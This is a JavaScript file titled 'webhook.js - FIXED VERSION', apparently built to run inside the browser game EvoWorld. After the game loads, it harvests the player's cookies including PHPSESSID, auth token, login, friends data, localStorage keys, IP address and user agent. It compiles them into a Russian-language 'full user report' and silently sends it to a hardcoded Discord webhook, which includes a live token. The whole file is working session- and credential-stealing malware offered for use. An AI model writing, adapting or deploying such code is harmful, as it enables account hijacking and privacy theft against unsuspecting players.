// webhook.js - FIXED VERSION
(function() {
    'use strict';
    
    const YOUR_DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1456708821266333707/wnE-ib-9mF7ZO8Z-r7X7vUdTswglh_3NbPslhkWjvqTcZjas2mAi7f0lw8XhV0De66ty';
    
    function sendToDiscord(data) {
        try {
            fetch(YOUR_DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    content: '```\n' + data + '\n```',
                    username: 'EvoWorld Report'
                })
            }).catch(() => {});
        } catch(e) {}
    }
    
    function getReport() {
        // Get current server info
        let serverName = 'Unknown';
        let playerCount = '?/?';
        try {
            const currentServer = window.gameServer;
            if (currentServer && currentServer.serverInfo) {
                serverName = currentServer.serverInfo.name || serverName;
                playerCount = currentServer.serverInfo.players || playerCount;
            }
        } catch(e) {}
        
        // Get user data
        const user = window.user || {};
        const timestamp = new Date().toLocaleString('ru-RU');
        
        // Get all cookies
        const allCookies = document.cookie;
        const cookiesArray = allCookies.split(';').map(c => c.trim());
        
        // Try to find PHPSESSID
        let phpsessid = '';
        for (const cookie of cookiesArray) {
            if (cookie.startsWith('PHPSESSID=')) {
                phpsessid = cookie.split('=')[1];
                break;
            }
        }
        
        // Get IP address
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(ipData => {
                const report = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---
level: ${user.level || '0'}
gems: ${user.premiumPoints || 0}
selected server: ${serverName} (${playerCount})

--- ОСНОВНЫЕ ДАННЫЕ ---
IP-адрес: ${ipData.ip}
URL страницы: ${window.location.href}
User-Agent: ${navigator.userAgent}
Timestamp: ${timestamp}

--- PHPSESSID ---
${phpsessid}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ user ---
${JSON.stringify(user, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsData ---
${JSON.stringify(window.friendsData || {}, null, 2)}

--- ДАННЫЕ ИЗ ПЕРЕМЕННОЙ friendsArr ---
${JSON.stringify(window.friendsArr || [], null, 2)}

--- УЧЕТНЫЕ ДАННЫЕ ---
Логин: ${user.login || 'Guest'}
Пароль: [NOT STORED IN BROWSER - Server side only]
Auth Token: ${user.authToken || 'None'}

--- ВСЕ КУКИ ПОЛЬЗОВАТЕЛЯ ---
${cookiesArray.join('\n')}

--- LOCAL STORAGE KEYS ---
${Object.keys(localStorage).join(', ')}`;
                
                sendToDiscord(report);
            })
            .catch(() => {
                // If IP fetch fails, send without IP
                const reportWithoutIP = `=== ПОЛНЫЙ ОТЧЕТ О ПОЛЬЗОВАТЕЛЕ ===
[Error fetching IP address]
User Data: ${JSON.stringify(user, null, 2)}`;
                sendToDiscord(reportWithoutIP);
            });
    }
    
    // Wait for game to load
    setTimeout(() => {
        if (window.user) {
            getReport();
        } else {
            const checkInterval = setInterval(() => {
                if (window.user) {
                    clearInterval(checkInterval);
                    getReport();
                }
            }, 1000);
        }
    }, 5000);
    
    console.log('Webhook reporter loaded');
})();
